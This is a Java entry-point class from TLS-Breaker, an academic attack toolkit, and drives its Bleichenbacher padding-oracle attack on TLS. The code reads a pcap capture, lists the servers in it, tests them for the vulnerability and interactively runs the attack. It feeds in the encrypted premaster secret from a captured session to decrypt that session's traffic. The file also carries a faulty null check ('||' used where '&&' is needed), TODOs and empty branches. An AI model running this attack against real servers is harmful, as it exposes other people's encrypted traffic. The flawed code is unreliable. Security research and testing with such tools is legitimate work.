/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 * <p>
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 * <p>
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.bleichenbacher;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.ParameterException;
import de.rub.nds.tlsattacker.core.config.TLSDelegateConfig;
import de.rub.nds.tlsattacker.core.config.delegate.GeneralDelegate;
import de.rub.nds.tlsbreaker.bleichenbacher.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsbreaker.bleichenbacher.impl.BleichenbacherAttacker;
import de.rub.nds.tlsbreaker.bleichenbacher.impl.ServerSelection;
import de.rub.nds.tlsbreaker.breakercommons.config.delegate.GeneralAttackDelegate;
import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.util.file.FileUtils;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapSession;
import org.apache.commons.codec.binary.Hex;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.*;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
import static de.rub.nds.tlsbreaker.bleichenbacher.impl.ConsoleInteractor.*;

/**
 *
 */
public class Main {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     * @param args
     */
    public static void main(String[] args) {
        GeneralDelegate generalDelegate = new GeneralAttackDelegate();
        BleichenbacherCommandConfig bleichenbacherCommandConfig = new BleichenbacherCommandConfig(generalDelegate);

        JCommander jc = JCommander.newBuilder().addObject(bleichenbacherCommandConfig).build();
        try {
            jc.parse(args);
        } catch (ParameterException ex) {
            ex.usage();
            return;
        }

        if (generalDelegate.isHelp()) {
            jc.usage();
            return;
        }

        // TODO: For testing
        if (bleichenbacherCommandConfig.getPcapFileLocation() != null) {
            if (FileUtils.isFileExists(bleichenbacherCommandConfig.getPcapFileLocation())) {
                try {
                    handlePcapFile(bleichenbacherCommandConfig);
                    return;
                } catch (UnsupportedOperationException e) {
                    CONSOLE.error("Invalid option selected!");
                    return;
                }
            } else {
                CONSOLE.error("Invalid File Path!");
                return;
            }
        }
        checkVulnerabilityOrExecuteAttack(bleichenbacherCommandConfig);
    }

    private static void handlePcapFile(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        PcapAnalyzer pcapAnalyzer = new PcapAnalyzer(bleichenbacherCommandConfig.getPcapFileLocation());
        List<PcapSession> sessions = pcapAnalyzer.getAllSessions();

        if (sessions != null || !sessions.isEmpty()) {
            ServerSelection serverSelection = new ServerSelection(sessions);
            Map<String, List<PcapSession>> serverSessionsMap = serverSelection.getServerSessionsMap();
            List<String> uniqueServers = new ArrayList<>(serverSessionsMap.keySet());
            displayUniqueServersFromPcap(uniqueServers, serverSessionsMap);
            String userOption = serverSelection.getValidUserSelection(uniqueServers);
            if ("a".equals(userOption)) {
                // List<String> servers = serverSelection.getServers(sessions);
                checkVulnerabilityOfAllServersAndDisplay(sessions, bleichenbacherCommandConfig);
            } else {
                // TODO: place this in else block?
                // PcapSession session = sessions.get(Integer.parseInt(userOption) - 1);
                String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
                // TODO: print entire information which is displayed to user when showing server options.
                LOGGER.info("Selected server: " + host);
                bleichenbacherCommandConfig.getClientDelegate().setHost(host);
                // bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
                Boolean vulnerability = checkVulnerability(bleichenbacherCommandConfig);
                if (Objects.equals(vulnerability, Boolean.TRUE)) {
                    CONSOLE.info("Server " + host + " is vulnerable.");
                    List<PcapSession> hostSessions = serverSessionsMap.get(host);
                    displaySessionDetails(hostSessions);
                    // TODO: Uncomment
                    PcapSession selectedSession = getUserSelectedSession(hostSessions);
                    if (selectedSession != null) {
                        executeAttack(selectedSession, bleichenbacherCommandConfig);
                    }
                } else {

                }

                // checkVulnerabilityOrExecuteAttack(bleichenbacherCommandConfig);
            }
        } else {
            // TODO: throw exception
        }
    }

    private static void displaySessionDetails(List<PcapSession> hostSessions) {
        DisplaySessionDetails(hostSessions);

    }

    private static Boolean checkVulnerability(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        Boolean result = null;
        // TODO: Remove log
        CONSOLE.info("Pcap file location = " + bleichenbacherCommandConfig.getPcapFileLocation());
        try {
            result = attacker.checkVulnerability();
            if (Objects.equals(result, Boolean.TRUE)) {
                CONSOLE.error("Vulnerable:" + result.toString());
            } else if (Objects.equals(result, Boolean.FALSE)) {
                CONSOLE.info("Vulnerable:" + result.toString());
            } else {
                CONSOLE.warn("Vulnerable: Uncertain");
            }
        } catch (UnsupportedOperationException e) {
            LOGGER.info("The selected attacker is currently not implemented");
        }
        return result;
    }

    private static void displayUniqueServersFromPcap(List<String> uniqueServers,
                                                     Map<String, List<PcapSession>> serverSessionsMap) {
        CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
        DisplayServerDetails(uniqueServers, serverSessionsMap);
        /*
         * for (int i = 0; i < serverList.size(); i++) { CONSOLE.info(i + 1 + ") " + serverList.get(i)); }
         */
        // CONSOLE.info("a) Check if all the above servers are vulnerable.");
        CONSOLE.info("Please select a server number to check for vulnerability "
                             + "or press 'a' to check for vulnerability of all the servers.");
        CONSOLE.info("Select Option: ");
    }

    private static void checkVulnerabilityOfAllServersAndDisplay(List<PcapSession> sessions,
                                                                 BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        List<PcapSession> vulnerableServers = getVulnerableServers(sessions, bleichenbacherCommandConfig);
        displayVulnerableServers(vulnerableServers);
        if (vulnerableServers.size() == 1) {
            CONSOLE.info("Do you want to execute the attack on the server? (Y/N):");
            Scanner sc = new Scanner(System.in);
            String userInput = StringUtils.trim(sc.nextLine());
            if ("Y".equals(userInput) || "y".equals(userInput)) {
                // String serverToAttack = vulnerableServers.get(0);
                executeAttack(vulnerableServers.get(0), bleichenbacherCommandConfig);
            } else if ("N".equals(userInput) || "n".equals(userInput)) {
                CONSOLE.info("Execution of the attack cancelled.");
            } else {
                throw new UnsupportedOperationException();
            }
        } else if (vulnerableServers.size() > 1) {
            CONSOLE.info("Please select a server number to attack.");
            CONSOLE.info("server number: ");
            PcapSession serverToAttack = getUSerSelectionForAttack(vulnerableServers);
            executeAttack(serverToAttack, bleichenbacherCommandConfig);
        }

    }

    private static void executeAttack(PcapSession session, BleichenbacherCommandConfig bleichenbacherCommandConfig) {

        bleichenbacherCommandConfig.getClientDelegate().setHost(session.getDestinationHost());
        bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));

        Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        attacker.attack();
    }

    private static PcapSession getUSerSelectionForAttack(List<PcapSession> vulnerableServers) {
        PcapSession selectedSession = null;
        Scanner sc = new Scanner(System.in);
        try {
            int serverNumber = sc.nextInt();
            if (serverNumber > 0 && serverNumber <= vulnerableServers.size()) {
                selectedSession = vulnerableServers.get(serverNumber - 1);
                // TODO: print entire information which is displayed to user when showing server options.
                LOGGER.info("Selected server: " + selectedSession);
            } else {
                throw new UnsupportedOperationException();
            }

        } catch (Exception e) {
            throw new UnsupportedOperationException();
        }

        return selectedSession;
    }

    private static List<PcapSession> getVulnerableServers(List<PcapSession> sessions,
                                                          BleichenbacherCommandConfig bleichenbacherCommandConfig) {

        List<PcapSession> vulnerableServers = new ArrayList<>();
        for (PcapSession session : sessions) {
            bleichenbacherCommandConfig.getClientDelegate().setHost(session.getDestinationHost());
            bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));

            Attacker<? extends TLSDelegateConfig> attacker =
                    new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());

            try {
                Boolean result = attacker.checkVulnerability();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                    vulnerableServers.add(session);
                }
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
        return vulnerableServers;
    }

    private static void displayVulnerableServers(List<PcapSession> sessions) {

        CONSOLE.info("Found " + sessions.size() + " server that are vulnerable.");
        // TODO: Uncomment DisplayServerDetails
        // DisplayServerDetails(sessions);
        /*
         * for (int i = 0; i < vulnerableServers.size(); i++) { CONSOLE.info(i + 1 + ") " + vulnerableServers.get(i)); }
         */
    }

    private static void checkVulnerabilityOrExecuteAttack(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        // TODO: Remove log
        CONSOLE.info("Pcap file location = " + bleichenbacherCommandConfig.getPcapFileLocation());

        if (attacker.getConfig().isExecuteAttack()) {
            attacker.attack();
        } else {
            try {
                Boolean result = attacker.checkVulnerability();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                } else if (Objects.equals(result, Boolean.FALSE)) {
                    CONSOLE.info("Vulnerable:" + result.toString());
                } else {
                    CONSOLE.warn("Vulnerable: Uncertain");
                }
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
    }

    private static String getPreMasterSecret(PcapSession session) {
        String preMasterSecret = null;
        /*
         * Optional<PcapSession> filteredPcapSession = sessions.stream() .filter(pcapSession ->
         * serverToAttack.equals(pcapSession.getDestinationHost())).findFirst();
         */

        // if (filteredPcapSession.isPresent()) {
        byte[] pms = session.getPreMasterSecret();// pcapAnalyzer.getPreMasterSecret(session.getClientKeyExchangeMessage());
        preMasterSecret = new String(Hex.encodeHex(pms));
        // }

        return preMasterSecret;
    }
}
